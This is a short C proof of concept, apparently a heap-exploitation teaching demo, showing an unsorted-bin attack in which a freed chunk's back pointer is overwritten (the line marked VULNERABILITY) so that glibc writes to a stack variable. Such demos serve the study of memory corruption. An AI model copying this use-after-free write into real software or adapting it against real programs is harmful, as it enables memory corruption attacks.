
#include <stdlib.h>
#include <assert.h>
int main()
{
	volatile unsigned long stack_var = 0;
	unsigned long *p = malloc(0x410);
	malloc(500);
	free(p);
	//------------VULNERABILITY-----------
	p[1] = (unsigned long)(&stack_var - 2);
	//------------------------------------
	malloc(0x410);
	assert(stack_var != 0);
}
